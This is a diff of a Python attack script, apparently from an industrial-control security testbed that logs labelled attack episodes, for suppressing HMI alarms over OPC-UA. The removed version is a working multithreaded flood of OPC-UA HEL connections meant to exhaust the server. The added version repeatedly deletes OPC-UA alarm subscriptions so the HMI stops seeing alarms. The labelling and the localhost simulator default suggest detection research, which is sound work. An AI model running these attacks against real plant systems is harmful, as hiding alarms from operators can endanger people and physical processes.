@@ -1,108 +1,88 @@
 """
 HMI_ALARM_SUPPRESS
-Kỹ thuật: Flood OPC-UA connections để exhaust server resources.
-          Khi server quá tải, HMI thật mất kết nối -> mất alarm.
-Observable: Hàng trăm TCP+HEL connections/s từ IP attacker.
+Kỹ thuật: Delete OPC-UA subscription -> HMI mat alarm.
+Yêu cầu: opcua_sim_server đang chạy.
 
 Gọi từ bash:
   python -m attacks_ext.hmi_alarm_suppress \
-      --duration 300 --opc-url opc.tcp://192.168.210.31:4840 \
+      --duration 300 --opc-url opc.tcp://127.0.0.1:4840 \
       --session-id bt_s1 --host-id attacker_host \
       --label-file labels/day7_timeline.csv
 """
 
-import socket
-import struct
+import asyncio
 import time
-import threading
 from attacks_ext.config_ext import base_parser, write_label
 
-THREADS = 10
+
+class _Handler:
+    def datachange_notification(self, node, val, data):
+        pass
 
 
-def build_hello(host, port):
-    endpoint = f"opc.tcp://{host}:{port}".encode()
-    ep_len = len(endpoint)
-    msg_size = 28 + ep_len
-    return (
-        b'HEL' + b'F' +
-        struct.pack('<IIIIII', msg_size, 0, 65536, 65536, 0, 0) +
-        struct.pack('<I', ep_len) + endpoint
-    )
-
-
-def flood_worker(host, port, hello, results, lock, end_time):
-    while time.time() < end_time:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(1)
-            s.connect((host, port))
-            s.send(hello)
-            time.sleep(0.05)
-            s.close()
-            with lock:
-                results["success"] += 1
-        except Exception:
-            with lock:
-                results["failed"] += 1
-
-
-def run(args):
+async def _run(args):
     label_prefix = "HMI_ALARM_SUPPRESS"
-
-    url = args.opc_url.replace("opc.tcp://", "")
-    parts = url.split(":")
-    host = parts[0]
-    port = int(parts[1]) if len(parts) > 1 else 4840
-
     write_label(args.label_file, label_prefix, "START",
                 args.session_id, args.host_id,
                 episode_id=args.episode_id, day=args.day,
-                note=f"dur={args.duration}s target={host}:{port} threads={THREADS}")
+                note=f"dur={args.duration}s opc={args.opc_url}")
 
-    results = {"success": 0, "failed": 0}
-    lock = threading.Lock()
-    hello = build_hello(host, port)
-    end_time = time.time() + args.duration
+    cycles = 0
 
     try:
-        print(f"[*] HMI_ALARM_SUPPRESS -> {host}:{port}")
-        print(f"[*] {THREADS} threads, duration {args.duration}s")
-        print(f"[*] Flood OPC-UA HEL -> resource exhaust -> HMI mat alarm")
+        from asyncua import Client
 
-        threads = []
-        for _ in range(THREADS):
-            t = threading.Thread(target=flood_worker,
-                                 args=(host, port, hello, results, lock, end_time))
-            t.daemon = True
-            threads.append(t)
-            t.start()
+        async with Client(url=args.opc_url) as client:
+            ns_idx = await client.get_namespace_index("PLC")
+            print(f"[+] OPC-UA connected, PLC namespace = {ns_idx}")
 
-        start = time.time()
-        while time.time() < end_time:
-            time.sleep(5)
-            elapsed = int(time.time() - start)
-            print(f"  [{elapsed:3d}s] sent={results['success']} failed={results['failed']}")
+            # Find alarm or any node to subscribe
+            sub_nodes = []
+            try:
+                alarms = await client.nodes.objects.get_child(f"{ns_idx}:PLC/Alarms")
+                for child in await alarms.get_children():
+                    sub_nodes.append(child)
+            except Exception:
+                plc = await client.nodes.objects.get_child(f"{ns_idx}:PLC")
+                child = await (await plc.get_children()).__anext__()
+                sub_nodes.append(child)
 
-        for t in threads:
-            t.join(timeout=3)
+            end_time = time.time() + args.duration
+            while time.time() < end_time:
+                # Create subscription
+                handler = _Handler()
+                sub = await client.create_subscription(100, handler)
+                for node in sub_nodes:
+                    await sub.subscribe_data_change(node)
+                print(f"  [SUB] Created subscription, {len(sub_nodes)} nodes")
+                await asyncio.sleep(3)
 
-        print(f"[*] Done: {results['success']} sent, {results['failed']} failed")
+                # Delete (attack)
+                await sub.delete()
+                print(f"  [DEL] Subscription deleted — HMI blind to alarms")
+                cycles += 1
+                await asyncio.sleep(5)
 
+    except ImportError:
+        print("[ERR] asyncua not installed: pip install asyncua cryptography")
+    except ConnectionRefusedError:
+        print(f"[ERR] OPC-UA server not running at {args.opc_url}")
     except Exception as e:
         print(f"[ERR] {e}")
     finally:
         write_label(args.label_file, label_prefix, "END",
                     args.session_id, args.host_id,
                     episode_id=args.episode_id, day=args.day,
-                    note=f"sent={results['success']} failed={results['failed']}")
+                    note=f"cycles={cycles}")
+
+
+def run(args):
+    asyncio.run(_run(args))
 
 
 def main():
-    p = base_parser("HMI Alarm Suppress (OPC-UA Resource Exhaust)")
-    p.add_argument("--opc-url", default="opc.tcp://192.168.210.31:4840")
-    p.add_argument("--opc-username", default="")
-    p.add_argument("--opc-password", default="")
+    p = base_parser("HMI Alarm Suppress (OPC-UA Subscription)")
+    p.add_argument("--opc-url", default="opc.tcp://127.0.0.1:4840")
     args = p.parse_args()
     run(args)
 
